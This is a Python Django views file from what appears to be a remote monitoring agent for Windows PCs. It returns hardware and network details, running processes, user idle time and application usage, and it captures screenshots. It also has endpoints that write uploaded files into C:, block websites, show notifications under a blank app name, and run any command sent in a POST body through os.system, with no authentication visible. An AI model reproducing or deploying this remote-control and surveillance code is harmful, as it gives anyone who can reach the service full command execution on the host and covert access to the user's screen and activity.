import base64
import os
import time
from datetime import datetime
from django.shortcuts import render
from django.http import JsonResponse
import platform, socket, re, uuid, json, psutil, logging, wmi
import pythoncom
import GPUtil
from django.core.files.storage import default_storage
import uptime
import public_ip as ip
import plyer
import pyautogui
from io import BytesIO
from PIL import Image
from .monitor import last_activity_time, start_time, track_active_application, get_app_usage
from .network_blocker import block_sites as block, unblock_sites



def get_processes():
    processes = []
    for proc in psutil.process_iter(
            ['pid', 'name', 'status', 'cpu_percent', 'memory_percent', 'create_time', 'username', 'exe']):
        try:
            info = proc.info
            if 'create_time' in info and info['create_time']:
                info['create_time'] = datetime.fromtimestamp(info['create_time']).strftime('%Y-%m-%d %H:%M:%S')
            processes.append(info)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    return processes


def get_disks_info():
    disks_info = {}
    partitions = psutil.disk_partitions()

    for partition in partitions:
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            disks_info[partition.device] = {
                "mountpoint": partition.mountpoint,
                "fstype": partition.fstype,
                "total": str(round(usage.total / (1024 ** 3), 1)) + "GB",
                "used": str(round(usage.used / (1024 ** 3), 1)) + "GB",
                "free": str(round(usage.free / (1024 ** 3), 1)) + "GB",
                "percent": usage.percent
            }
        except PermissionError:
            disks_info[partition.device] = {
                "mountpoint": partition.mountpoint,
                "error": "Permission denied"
            }
    return disks_info


def getSystemInfo():
    pythoncom.CoInitialize()
    computer = wmi.WMI()
    info = {}
    gpu_num_index = 0
    info['server-uptime'] = str(round(uptime.uptime() / 60, 1)) + " minutes"
    info['platform'] = platform.system()
    info['platform-release'] = platform.release()
    info['platform-version'] = platform.version()
    info['architecture'] = platform.machine()
    info['hostname'] = socket.gethostname()
    info['ip-address'] = socket.gethostbyname(socket.gethostname())
    info['public-ip-address'] = ip.get()

    info['mac-address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    info['processor'] = platform.processor()

    try:
        afk_seconds = time.time() - last_activity_time
        info["afk_time_seconds"] = round(afk_seconds, 1)
    except Exception as e:
        pass

    info['gpu'] = {}
    info['processes'] = {}
    while True:
        try:
            info['gpu'][gpu_num_index] = computer.Win32_VideoController()[gpu_num_index].name
            gpu_num_index += 1
        except Exception as e:
            break

    for process in get_processes():
        info['processes'][process['name']] = {
            'PID': process['pid'],
            'Status': process['status']
        }

    info['cpu_usage'] = str(psutil.cpu_percent(interval=1))

    memory = psutil.virtual_memory()
    info['memory_usage'] = {
        "total": str(round(memory.total / (1024 ** 3), 1)) + "GB",
        "used": str(round(memory.used / (1024 ** 3), 1)) + "GB",
        "available": str(round(memory.available / (1024 ** 3), 1)) + "GB",
        "percent": memory.percent
    }

    info['disk_usage'] = get_disks_info()

    net_io = psutil.net_io_counters()
    info['network_usage'] = {
        "bytes_sent": str(round(net_io.bytes_sent / (1024 ** 3), 1)) + "GB",
        "bytes_recv": str(round(net_io.bytes_recv / (1024 ** 3), 1)) + "GB",
        "packets_sent": net_io.packets_sent,
        "packets_recv": net_io.packets_recv
    }

    gpus = GPUtil.getGPUs()
    gpu_info = []
    for gpu in gpus:
        gpu_info.append({
            "id": gpu.id,
            "name": gpu.name,
            "load": gpu.load * 100,
            "memory_used": gpu.memoryUsed,
            "memory_total": gpu.memoryTotal,
            "temperature": gpu.temperature
        })
    info['gpu_usage'] = gpu_info
    info['server_working_seconds'] = round(time.time() - start_time, 1)
    info['active_apps'] = get_app_usage()

    for process in get_processes():
        info['processes'][process['name']] = {'PID': process['pid'], 'Status': process['status'],
                                              'cpu_percent': process['cpu_percent'],
                                              'memory_percent': process['memory_percent'],
                                              'create_time': process['create_time']}

    return info


def get(request):
    return JsonResponse(getSystemInfo())


def file_post(request):
    if request.method == "POST":
        if 'file' in request.FILES:
            uploaded_file = request.FILES['file']

            try:
                json_body = json.loads(request.body)
                target_path = '/C:'
            except json.JSONDecodeError:
                return JsonResponse({'status': 'no', 'error': 'Invalid JSON in request body'})

            if not target_path:
                return JsonResponse({'status': 'no', 'error': 'file_path is required in JSON body'})

            if not os.path.isdir(target_path):
                return JsonResponse({'status': 'no', 'error': f'Directory {target_path} does not exist'})

            file_path = os.path.join(target_path, uploaded_file.name)

            try:
                with open(file_path, 'wb+') as destination:
                    for chunk in uploaded_file.chunks():
                        destination.write(chunk)
                return JsonResponse({'status': 'yes', 'message': f'File saved to {file_path}'})
            except Exception as e:
                return JsonResponse({'status': 'no', 'error': str(e)})

    return JsonResponse({'status': 'no', 'error': 'Invalid request method'})


def cmd(request):
    if request.method == "POST":

        try:
            json_body = json.loads(request.body)
            if 'cmd' in json_body:
                result = os.system(json_body['cmd'])
                return JsonResponse({'status': 'yes', 'message': 'Command executed successfully', 'result': result})
        except json.JSONDecodeError:
            return JsonResponse({'status': 'no', 'error': 'Invalid JSON body'})

    return JsonResponse({'status': 'no', 'error': 'Invalid request method'})


def notify(request):
    if request.method == "POST":
        try:
            json_body = json.loads(request.body)
            msg = json_body['msg']
            header = json_body['header']
        except:
            return JsonResponse({'status': 'no', 'error': 'Invalid JSON body'})

        plyer.notification.notify(message=msg,
                                  app_name="ㅤ",
                                  app_icon='',
                                  title=header)
        return JsonResponse({'status': 'yes', 'message': 'Command executed successfully'})
    return JsonResponse({'status': 'no', 'error': 'Invalid request method'})


def screen(request):
    screenshot = pyautogui.screenshot()
    byte_stream = BytesIO()
    screenshot.save(byte_stream, format='PNG')
    image_bytes = byte_stream.getvalue()

    image_base64 = base64.b64encode(image_bytes).decode('utf-8')

    return JsonResponse({
        'status': 'yes',
        'message': 'Here is bytes of screen',
        'bytes': image_base64
    })

def block_sites(request):
    if request.method == "POST":
        try:
            json_body = json.loads(request.body)
            blocked_sites = json_body.get('block_sites', [])

            if not blocked_sites:
                return JsonResponse({'status': 'no', 'error': 'No sites provided to block'})

            unblock_sites(blocked_sites)
            block(blocked_sites)

            return JsonResponse({'status': 'ok', 'message': 'Sites blocked successfully'})

        except json.JSONDecodeError:
            return JsonResponse({'status': 'no', 'error': 'Invalid JSON body'})
        except KeyError:
            return JsonResponse({'status': 'no', 'error': 'Key "block_sites" is missing'})
        except Exception as e:
            return JsonResponse({'status': 'no', 'error': f'Error: {str(e)}'})

    else:
        return JsonResponse({'status': 'no', 'error': 'Invalid request method'})
